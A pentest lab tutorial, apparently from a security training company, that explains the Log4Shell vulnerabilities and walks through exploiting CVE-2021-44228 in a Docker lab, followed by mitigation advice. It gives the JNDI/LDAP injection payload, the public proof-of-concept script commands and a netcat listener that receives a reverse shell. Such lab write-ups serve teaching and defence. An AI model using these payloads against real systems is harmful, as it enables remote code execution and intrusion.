[[ PAGE 1 ]]
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
[[ PAGE 2 ]]
 
 
 Page 2 of 13 
 
Contents  
Introduction ........................................................................................... 3 
Log4jshell ................................................................................................ 3 
What is Log4J. ......................................................................................... 4 
What is LDAP and JNDI ........................................................................... 4 
JNDI and LDAP Chemistry ....................................................................... 4 
Log4J JNDI Lookup .................................................................................. 5 
Pentest Lab Setup ................................................................................... 6 
Exploiting Log4j (CVE-2021-44228) ........................................................ 8 
Mitigation ............................................................................................. 12 
 
 
 
[[ PAGE 3 ]]
 
 
 Page 3 of 13 
 
Introduction 
we are going to discuss and demonstrate in our lab setup the exploitation of the new vulnerability 
identified as CVE-2021-44228 affecting the Java logging package, Log4J. This vulnerability has a severity 
score of 10.0, the most critical designation, and offers remote code execution on hosts engaging with 
software that uses the log4j utility. This attack has also been called "Log4Shell".  
Log4jshell  
CVE-2021-44228 
Description: Apache Log4j2 2.0-beta9 through 2.12.1 and 2.13.0 through 2.15.0 JNDI features used in the 
configuration, log messages, and parameters do not protect against attacker-controlled LDAP and other 
JNDI related endpoints. An attacker who can control log messages or log message parameters can execute 
arbitrary code loaded from LDAP servers when message lookup substitution is enabled.  
Vulnerability Type 
Remote Code Execution 
Severity 
 
Critical 
Base CVSS Score 
10.0  
Versions Affected 
All versions from 2.0-beta9 to 2.14.1 
CVE-2021-45046 
It was found that the fix to address CVE-2021-44228 in Apache Log4j 2.15.0 was incomplete in certain 
non-default configurations. When the logging configuration uses a non-default pattern layout with a 
context lookup (for example, $${ctx:loginId}), attackers with control over Thread Context Map (MDC) 
input data can craft malicious input data using a JNDI Lookup pattern, resulting in an information leak and 
remote code execution in some environments and local code execution in all environments; remote code 
execution has been demonstrated on macOS but no other tested environments. 
Vulnerability Type 
Remote Code Execution 
Severity 
 
Critical 
Base CVSS Score 
9.0  
Versions Affected 
All versions from 2.0-beta9 to 2.15.0, excluding 2.12.2 
CVE-2021-45105 
Apache Log4j2 versions 2.0-alpha1 through 2.16.0 did not protect from uncontrolled recursion from self-
referential lookups. When the logging configuration uses a non-default Pattern Layout with a Context 
Lookup (for example, $${ctx:loginId}), attackers with control over Thread Context Map (MDC) input data 
can craft malicious input data that contains a recursive lookup, resulting in a StackOverflowError that will 
terminate the process. This is also known as a DOS (Denial of Service) attack. 
 
 
[[ PAGE 4 ]]
 
 
 Page 4 of 13 
 
Vulnerability Type 
Denial of Service 
Severity 
 
High 
Base CVSS Score 
7.5  
Versions Affected 
All versions from 2.0-beta9 to 2.16.0 
What is Log4J.  
Log4j is a Java-based logging utility that is part of the Apache Logging Services. Log4j is one of the 
several Java logging frameworks which is popularly used by millions of Java applications on the internet.  
What is LDAP and JNDI 
LDAP (Lightweight Directory Access Protocol) is an open and cross-platform protocol that is used for 
directory service authentication. It provides the communication language that applications use to 
communicate with other directory services. Directory services store lots of important information like user 
account details, passwords, computer accounts, etc., which is shared with other devices on the network. 
JNDI (Java Naming and Directory Interface) is an application programming interface (API) that provides 
naming and directory functionality to applications written using Java Programming Language.  
 
 
 
JNDI and LDAP Chemistry  
JNDI provides a standard API for interacting with name and directory services using a service provider 
interface (SPI). JNDI provides Java applications and objects with a powerful and transparent interface to 
access directory services like LDAP. The table below shows the common LDAP and JNDI equivalent 
operations. 
[[ PAGE 5 ]]
 
 
 Page 5 of 13 
 
 
Log4J JNDI Lookup 
Lookup is a kind of mechanism that adds values to the log4j configuration at arbitrary places. Log4j has 
the ability to perform multiple lookups such as map, system properties, and JNDI (Java Naming and 
Directory Interface) lookups.  
Log4j uses the JNDI API to obtain naming and directory services from several available service providers: 
LDAP, COS (Common Object Services), Java RMI registry (Remote Method Invocation), DNS (Domain 
Name Service), etc. if this functionality is implemented, we should this line of code somewhere in the 
program: ${jndi:logging/context-name} 
A Normal Log4J Scenario 
 
The above diagram shows a normal log4j scenario.  
Exploit Log4j Scenario 
[[ PAGE 6 ]]
 
 
 Page 6 of 13 
 
An attacker who can control log messages or log messages parameters can execute arbitrary code on 
the vulnerable server loaded from LDAP servers when message lookup substitution is enabled. As a 
result, an attacker can craft a special request that would make the utility remotely download and 
execute the payload. 
 Below is the most common example of it using the combination of JNDI and LDAP: 
${jndi:ldap://<host>:<port>/<payload>} 
 
1. An attacker inserts the JNDI lookup in a header field that is likely to be logged. 
2. The string is passed to log4j for logging. 
3. Log4j interpolates the string and queries the malicious LDAP server.  
4. The LDAP server responds with directory information that contains the malicious Java Class.  
5. Java deserialize (or download) the malicious Java Class and executes it.  
Pentest Lab Setup 
In the lab setup, we will use Kali VM as the attacker machine and Ubuntu VM as the target machine. So 
let’s prepare the ubuntu machine.  
 
 
git clone https://github.com/kozmer/log4j-shell-poc .git 
[[ PAGE 7 ]]
 
 
 Page 7 of 13 
 
 
Once the git clone command has been completed, browse to the log4j-shell-poc directory.  
 
Once inside that directory, we can now execute the docker command.  
 
 
 
After that, run the second command on the github page 
 
 
 
 
These commands will enable us to use the docker file with a vulnerable app.  
cd log4j-shell-poc/ 
docker build -t log4j-shell-poc . 
docker run --network host log4j-shell-poc 
[[ PAGE 8 ]]
 
 
 Page 8 of 13 
 
 
 
Once completed, we have our vulnerable webapp server ready. Open a browser on the ubuntu machine 
and type the following address: 127.0.0.1:8080.  
Now let’s browse to the target IP address in our kali’s browser at port 8080. 
 
 
So, this is the docker vulnerable application, and the area which is affected by this vulnerability is the 
username field. It is here that we are going to inject our payload. So now, the lab setup is done. We have 
our vulnerable target machine up and running. Time to perform the attack. 
Exploiting Log4j (CVE-2021-44228) 
On the kali machine, we need to git clone the same repository. So, type the following command:  
git clone https://github.com/kozmer/log4j-shell-poc.git 
[[ PAGE 9 ]]
 
 
 Page 9 of 13 
 
 
 
 
Now we need to install the JDK version. This can be downloaded at the following link.  
https://mirrors.huaweicloud.com/java/jdk/8u202-b08/  
Click on the correct version and download that inside the Kali Linux.  
 
Now go to the download folder and unzip that file by executing the command. 
 
 
 
 
 No, we need to move the extracted file to the folder usr/bin and browse to the folder /usr/bin/ and 
verify if jdk is here. 
tar -xf jdk-8u202-linux-x64.tar.gz 
mv jdk1.8.0 202 /usr/bin 
cd /usr/bin/ 
ls | grep jdk1.8.0 202 
[[ PAGE 10 ]]
 
 
 Page 10 of 13 
 
 
Once verified, let’s exit from this directory and browse to the log4j-shell-poc directory. That folder 
contains a python script, poc.py which we are going to configure as per our lab setup settings. Here you 
need to modify ‘./jdk1.8.2.20/’ to ‘/usr/bin/jdk1.8.0_202/ as highlighted. what we have done here is we 
have to change the path of the java location and the java version in the script. 
Now we need to perform the same changes in the create_ldap_server function. There is 2 line of code 
that needs to be changed.  
 
Now that all changes have been made, we need to save the file and get ready to start the attack. In 
attacker machine, that is the Kali Linux, we will access the docker vulnerable web app application inside 
a browser by typing the IP of the ubuntu machine:8080  
[[ PAGE 11 ]]
 
 
 Page 11 of 13 
 
Now let’s initiate a netscan listener and start the attack.  
 
 
 
Type the following command in a terminal. Make sure you are in the log4j-shell-poc directory when 
executing the command. 
 
  
 
This script started the malicious local ldap server.  
Now let 
Copy the complete command after send me: ${jndi:ldap://192.168.1.108:1389/a} and paste it inside 
the browser in the username field. This will be our payload. In the password field, you can provide 
anything.  
python3 poc.py --userip 192.168.29.163 --webport 8000 --lport 9001 
nc -lvp 9001 
[[ PAGE 12 ]]
 
 
 Page 12 of 13 
 
 
Click on the login button to execute the payload. Then switch to the netcat windows where we should 
get a reverse shell.  
 
We are finally inside that vulnerable webapp docker image.  
Mitigation 
CVE-2021-44228: Fixed in Log4j 2.15.0 (Java 8) 
Implement one of the following mitigation techniques: 
 
Java 8 (or later) users should upgrade to release 2.16.0. 
 
Java 7 users should upgrade to release 2.12.2. 
[[ PAGE 13 ]]
 
 
 Page 13 of 13 
 
 
Otherwise, in any release other than 2.16.0, you may remove the JndiLookup class from the 
classpath: zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class 
 
Users are advised not to enable JNDI in Log4j 2.16.0. If the JMS Appender is required, use Log4j 
2.12.2  
CVE-2021-45046: Fixed in Log4j 2.12.2 (Java 7) and Log4j 2.16.0 (Java 8) 
Implement one of the following mitigation techniques: 
 
Java 8 (or later) users should upgrade to release 2.16.0. 
 
Java 7 users should upgrade to release 2.12.2. 
 
Otherwise, in any release other than 2.16.0, you may remove the JndiLookup class from the 
classpath: zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class 
 
Users are advised not to enable JNDI in Log4j 2.16.0. If the JMS Appender is required, use Log4j 
2.12.2. 
CVE-2021-45105: Fixed in Log4j 2.17.0 (Java 8) 
Implement one of the following mitigation techniques: 
 
Java 8 (or later) users should upgrade to release 2.17.0. 
 
In PatternLayout in the logging configuration, replace Context Lookups like ${ctx:loginId} or 
$${ctx:loginId} with Thread Context Map patterns (%X, %mdc, or %MDC). 
 
Otherwise, in the configuration, remove references to Context Lookups like ${ctx:loginId} or 
$${ctx:loginId} where they originate from sources external to the application such as HTTP 
headers or user input. 
 
To read more about mitigation, you can access the following link: 
https://logging.apache.org/log4j/2.x/security.html      
 
 
 
 
 
 
 
 
 
 
 
 
[[ PAGE 14 ]]
JOIN OUR
TRAINING PROGRAMS
www.ignitetechnologies.in
BEGINNER
Network Pentest
Bug Bounty
Wireless Pentest
Network Security
Essentials
Ethical Hacking
ADVANCED
EXPERT
Burp Suite Pro
CTF
Windows
Linux
Pro
Infrastructure VAPT
APT’s - MITRE Attack Tactics
MSSQL Security Assessment
Active Directory Attack
Red Team Operation
Privilege Escalation
Web
Services-API
Android Pentest
Computer
Forensics
Advanced
Metasploit
CLICK HERE
